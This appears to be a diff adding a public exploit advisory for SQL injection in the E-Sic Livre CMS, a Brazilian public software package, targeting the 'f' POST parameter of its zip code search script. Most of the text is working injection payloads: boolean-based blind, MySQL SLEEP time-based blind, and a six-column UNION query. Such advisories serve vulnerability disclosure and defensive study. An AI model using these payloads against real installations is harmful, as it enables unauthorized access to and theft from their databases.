@@ -1,0 +1,36 @@
+# Exploit Title: E-Sic Software livre CMS - Sql Injection
+# Date: 12/10/2017
+# Exploit Author: Elber Tavares
+# fireshellsecurity.team/
+# Vendor Homepage: https://softwarepublico.gov.br/
+# Version: 1.0
+# Tested on: kali linux, windows 7, 8.1, 10 - Firefox
+# Download
+https://softwarepublico.gov.br/social/e-sic-livre/versoes-estaveis/esiclivre.rar
+More informations:
+
+http://whiteboyz.xyz/esic-software-publico-sql-injection.html
+
+Vulnerability is in the zip code search script
+---------------------------------------------------------------------
+
+Url: http://localhost/esiclivre/restrito/inc/buscacep.php
+
+
+DATA:
+
+Parameter: f (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: f=-1932' OR 5987=5987 AND 'dtev'='dtev
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: f=test' OR SLEEP(5) AND 'kucr'='kucr
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 6 columns
+    Payload: f=test' UNION ALL SELECT 3344,3344,
+
+CONCAT(0x7162627a71,0x54657946565941494562654c437570647a4f4e53616744546e526663454152424e71506e564d6853,0x71786a6a71),
+    3344,3344,3344#
